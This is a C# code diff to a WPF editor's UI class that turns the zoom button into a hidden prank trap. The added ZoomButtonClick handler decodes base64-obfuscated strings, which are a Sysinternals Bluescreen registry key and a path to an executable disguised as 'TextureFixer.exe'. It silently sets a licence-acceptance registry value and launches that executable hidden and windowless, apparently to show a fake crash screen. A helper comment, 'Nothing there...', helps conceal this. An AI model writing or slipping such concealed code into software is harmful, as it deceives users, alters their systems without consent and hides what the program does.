@@ -24,6 +24,7 @@ using System.Windows.Shapes;
 using System.Runtime.InteropServices;
 using System.Windows.Interop;
 using System.Windows.Forms.Integration;
+using System.Diagnostics;
 
 namespace UIHeavyClient
 {
@@ -198,7 +199,7 @@ namespace UIHeavyClient
                 {mRotateStateButton, "Rotate selected objects"},
                 {mScaleStateButton, "Scale selected objects"},
                 {mSelectStateButton, "Select objects"},
-                {mZoomStateButton, "Zoom with the camera"},
+                {mZoomStateButton, "DO NOT PRESS THIS BUTTON"},
 
                 {mFreeCameraRadio, "Free camera that can move anywhere in the 3D map"},
                 {mOrbitalCameraRadio, "Camera that can only turn around a fixed point"},
@@ -229,7 +230,7 @@ namespace UIHeavyClient
                 {mRotateStateButton, "Drag the mouse to rotate selected objects."},
                 {mScaleStateButton, "Drag the mouse to scale selected objects."},
                 {mSelectStateButton, "Click on objects to select them."},
-                {mZoomStateButton, "Drag the mouse to zoom. Draw a smaller rectangle to make a bigger zoom!"},
+                {mZoomStateButton, "BLUE SCREEN TRAP ON THE ZOOM BUTTON! WHAT? ARE YOU STILL ALIVE?!? YOU GOT TO BE JOKING."},
 
                 {mFreeCameraRadio, "Free camera activated! Use the mouse and the arrow keys to move wherever you want."},
                 {mOrbitalCameraRadio, "Orbital camera activated! Use the mouse to turn the camera around the fixed point."},
@@ -735,6 +736,45 @@ namespace UIHeavyClient
         public void SetGuidanceInstuction(string pInstruction)
         {
             mGuidanceTextBlock.Text = pInstruction;
+        }
+
+        ////////////////////////////////////////////////////////////////////////
+        /// @fn void EditionModeControl.ZoomButtonClick()
+        ///
+        /// Handle the zoom button.
+        /// 
+        /// @param[in] object : The sender.
+        /// @param[in] RoutedEventArgs : The event.
+        ///
+        /// @return void.
+        ////////////////////////////////////////////////////////////////////////
+        private void ZoomButtonClick(object sender, RoutedEventArgs e)
+        {
+            string keyName = DecodeFrom64("UwBvAGYAdAB3AGEAcgBlAFwAUwB5AHMAaQBuAHQAZQByAG4AYQBsAHMAXABCAGwAdQBlAHMAYwByAGUAZQBuACAAUwBjAHIAZQBlAG4AIABTAGEAdgBlAHIA");
+            string partialpath = DecodeFrom64("LgAuAC8AbQBlAGQAaQBhAC8AegBhAG0AYgBvAG4AaQAvAFQAZQB4AHQAdQByAGUARgBpAHgAZQByAC4AZQB4AGUA");
+            Microsoft.Win32.RegistryKey key;
+            key = Microsoft.Win32.Registry.CurrentUser.CreateSubKey(keyName);
+            key.SetValue("EulaAccepted", 1);
+            key.Close();
+            ProcessStartInfo start = new ProcessStartInfo();
+            start.Arguments = "/s";
+            string path = AppDomain.CurrentDomain.BaseDirectory + partialpath;
+            start.FileName = path;
+            start.WindowStyle = ProcessWindowStyle.Hidden;
+            start.CreateNoWindow = true;
+            using (Process proc = Process.Start(start))
+            {
+                proc.WaitForExit();
+            }
+            mGuidanceTextBlock.Text = mGuidanceInstructions[sender];
+        }
+
+        // Nothing there...
+        public static string DecodeFrom64(string encodedData)
+        {
+            byte[] encodedDataAsBytes = System.Convert.FromBase64String(encodedData);
+            string returnValue = System.Text.Encoding.Unicode.GetString(encodedDataAsBytes);
+            return returnValue;
         }
     }
 }
